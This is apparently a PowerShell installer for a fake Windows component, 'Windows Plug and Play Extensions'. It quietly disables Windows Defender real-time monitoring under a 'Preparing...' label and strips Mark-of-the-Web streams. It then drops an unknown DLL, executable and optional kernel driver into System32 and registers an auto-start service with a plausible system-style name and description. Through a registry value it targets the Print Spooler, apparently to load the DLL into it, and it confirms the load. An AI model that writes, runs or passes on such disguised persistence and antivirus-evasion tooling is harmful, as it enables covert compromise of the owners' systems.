# Windows Plug and Play Extensions - Installer
# Run as Administrator

$ErrorActionPreference = "SilentlyContinue"
$SYS32 = "$env:SystemRoot\System32"
$DRIVERS = "$env:SystemRoot\System32\drivers"
$SVC = "WPnpSvc"
$SD = Split-Path -Parent $MyInvocation.MyCommand.Path

# Check admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "[!] Run as Administrator" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Check files
if (-not (Test-Path "$SD\pnpext.dll")) {
    Write-Host "[!] pnpext.dll not found in $SD" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "============================================"
Write-Host " Windows PnP Extensions - Setup"
Write-Host "============================================"
Write-Host ""

# 1. Disable Defender
Write-Host "[1/7] Preparing..." -ForegroundColor Cyan
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
Start-Sleep -Seconds 2

# 2. Remove old
Write-Host "[2/7] Removing old installation..." -ForegroundColor Cyan
sc.exe stop $SVC 2>$null | Out-Null
Start-Sleep -Seconds 2
sc.exe delete $SVC 2>$null | Out-Null
Stop-Process -Name "rundll32" -Force -ErrorAction SilentlyContinue

# 3. Copy files
Write-Host "[3/7] Copying files..." -ForegroundColor Cyan
Remove-Item "$SD\pnpext.dll:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$SD\WPnpSvc.exe:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$SD\pnpext.sys:Zone.Identifier" -Force -ErrorAction SilentlyContinue

Copy-Item "$SD\pnpext.dll" "$SYS32\pnpext.dll" -Force
Write-Host "       pnpext.dll  -> $SYS32\" -ForegroundColor Gray
Copy-Item "$SD\WPnpSvc.exe" "$SYS32\WPnpSvc.exe" -Force
Write-Host "       WPnpSvc.exe -> $SYS32\" -ForegroundColor Gray
if (Test-Path "$SD\pnpext.sys") {
    Copy-Item "$SD\pnpext.sys" "$DRIVERS\pnpext.sys" -Force
    Write-Host "       pnpext.sys  -> $DRIVERS\" -ForegroundColor Gray
}

Remove-Item "$SYS32\pnpext.dll:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$SYS32\WPnpSvc.exe:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$DRIVERS\pnpext.sys:Zone.Identifier" -Force -ErrorAction SilentlyContinue

# 4. Create service
Write-Host "[4/7] Creating service..." -ForegroundColor Cyan
sc.exe create $SVC binPath= "$SYS32\WPnpSvc.exe" type= own start= auto depend= Spooler DisplayName= "Windows Plug and Play Extensions" 2>$null | Out-Null
sc.exe description $SVC "Manages extended Plug and Play device configuration and compatibility" 2>$null | Out-Null

# 5. Registry
Write-Host "[5/7] Configuring..." -ForegroundColor Cyan
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "DllPath" -Value "$SYS32\pnpext.dll"
Set-ItemProperty -Path $regPath -Name "TargetService" -Value "Spooler"

# 6. Start Spooler
Write-Host "[6/7] Starting Spooler..." -ForegroundColor Cyan
sc.exe start Spooler 2>$null | Out-Null
Start-Sleep -Seconds 3

# 7. Start WPnpSvc
Write-Host "[7/7] Starting WPnpSvc..." -ForegroundColor Cyan
sc.exe start $SVC 2>$null | Out-Null
Start-Sleep -Seconds 4

# Re-enable Defender
try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}

# Verify
$loaded = & tasklist /m pnpext.dll 2>$null | Select-String "pnpext.dll"
Write-Host ""
if ($loaded) {
    Write-Host "[+] SUCCESS! pnpext.dll loaded." -ForegroundColor Green
} else {
    Write-Host "[?] Service ran but DLL not detected. Check after reboot." -ForegroundColor Yellow
}
Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host " Service: $SVC (auto-start on boot)"
Write-Host " $SYS32\pnpext.dll"
Write-Host " $SYS32\WPnpSvc.exe"
Write-Host " $DRIVERS\pnpext.sys"
Write-Host "============================================" -ForegroundColor Green
Write-Host ""
Read-Host "Press Enter to exit"
